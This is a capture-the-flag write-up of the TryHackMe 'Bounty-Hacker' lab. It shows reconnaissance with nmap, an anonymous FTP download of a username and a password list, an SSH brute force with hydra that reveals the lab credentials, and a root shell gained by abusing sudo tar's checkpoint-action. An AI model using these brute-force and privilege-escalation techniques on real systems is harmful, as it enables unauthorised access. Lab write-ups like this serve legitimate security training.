# Bounty-Hacker

**IP:** 10.10.57.14  
**Platform:** THM  
**Difficulty:** Easy  
**OS:** Linux  
**Date:** 01/06/2025

## Reconnaissance

```bash
nmap -sC -sV -T4 10.10.57.14 -oA nmap/Bounty-Hacker
```

| Port | Service | Version |
|------|---------|---------|
| 21 | ftp | vsftpd 3.0.3 |
| 22 | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 80 | http | Apache httpd 2.4.18 |

## Enumeration

FTP allowed for anonymous login, I had to disable passive mode in FTP with `passive`. There was two files in the FTP server `locks.txt` and `task.txt`, so I downloaded them.
```bash
ftp 10.10.199.16 21      

Connected to 10.10.199.16.
220 (vsFTPd 3.0.3)
Name (10.10.199.16:wither): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> passive
Passive mode: off; fallback to active mode: off.

ftp> dir
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.

ftp> mget *
mget locks.txt [anpqy?]? 
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |***********************************************************************************************************************************************|   418        8.49 KiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (5.84 KiB/s)
mget task.txt [anpqy?]? 
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |***********************************************************************************************************************************************|    68        1.00 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.75 KiB/s)

ftp> exit
221 Goodbye.
```

`task.txt` leaked a username `lin`.
```bash
cat task.txt

1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

`locks.txt` contained a list of potential passwords.
```bash                                                             
cat locks.txt 

rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

## Exploitation

I brute forced an SSH login `lin:RedDr4gonSynd1cat3` with hydra.
```bash
hydra -l lin -P locks.txt  ssh://10.10.199.16 -t 10 -vI
...
[22][ssh] host: 10.10.199.16   login: lin   password: RedDr4gonSynd1cat3
...
```

user flag was in `/home/lin/Desktop/user.txt`.
```bash
cat /home/lin/Desktop/user.txt
```

## Privilege Escalation

`lin` could run `/bin/tar` as the `root` user.
```bash
sudo -l

[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

I used this to spawn a privileged shell.
```bash
sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

/bin/tar: Removing leading `/' from member names

id
uid=0(root) gid=0(root) groups=0(root)
```

root flag was in `/root/root.txt`
```bash
cat /root/root.txt
```

---

#nmap #ftp-anonymous #hydra #ssh-bruteforce #sudo-privesc #tar-privesc #credential-discovery #thm